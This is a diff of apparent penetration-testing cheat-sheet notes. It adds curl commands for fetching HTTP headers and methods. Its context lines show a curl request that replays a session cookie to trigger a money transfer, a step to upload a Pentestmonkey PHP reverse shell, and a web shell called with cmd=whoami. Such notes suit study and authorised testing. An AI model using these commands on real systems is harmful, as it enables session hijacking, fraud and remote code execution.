@@ -538,7 +538,10 @@ a. Network Exploitation
 		--PHPSESSID where you can get from the website cookie
 		
 		curl -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" --data "recipient_account=1&amount=1" -b "PHPSESSID=goh9mlcsl60rsmkbkamrskiif9" http://3.76.115.174/transfer.php
-		
+
+		-- curl headers:
+		curl -I http://IP_ADDRESS
+
 		f.) Upload a PHP reverse shell to a website, access it to establish a session
 		
 			1. Download PHP payload from: Pentestmonkey
@@ -596,6 +599,8 @@ Run the php using curl: curl http://10.10.10.9/0xdf.php?cmd=whoami
 
 e.) Test HTTP Method to upload files:
 davtest -url http://$IP_ADDRESS
+curl -X OPTIONS -I http://$IP_ADDRESS
+
 
 f.) Some other Powershell commands:
 Download a file:
